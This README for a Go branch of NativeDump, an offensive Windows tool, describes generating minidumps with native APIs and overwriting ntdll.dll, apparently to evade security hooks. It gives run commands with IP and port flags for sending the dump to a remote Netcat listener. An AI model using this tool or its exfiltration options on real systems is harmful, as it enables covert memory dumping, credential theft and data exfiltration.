# NativeDump - "golang-flavour" branch

This branch implements the same functionality as the main branch using Golang: 

- Minidump file generation using only NTAPIS
- Overwrite the Ntdll.dll library (Optional)
- Exfiltrate the file to another host (Optional)

You can run it as a script:

```
go run nativedump.go [-o OPTION] [-k PATH] [-i IP_ADDRESS] [-p PORT_ADDRESS]
```

![golang1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Golang1.png)


As an alternative, you can compile it to a binary:

 ```
go build
```

![golang2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Golang2.png)

You can use the *-o* parameter for overwriting the ntdll.dll library:
- "disk": Using a DLL already on disk. If *-k* parameter is not used the path is "C:\Windows\System32\ntdll.dll".
- "knowndlls": Using the KnownDlls folder.
- "debugproc": Using a process created in debug mode. If *-k* parameter is not used the process is "c:\windows\system32\calc.exe"

You can use *-i* (IP address) and *-p* (port) parameters to exfiltrate the file to another host, not creating a local file.

In this example, the ntdll.dll library is overwritten from a debug process, the Minidump file is generated and exfiltrated to 192.168.1.72:1234:

![ntdlloverwrite](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Golang3.png)

The Netcat listener receives the file correctly:

![dumpfile](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_Golang4.png)
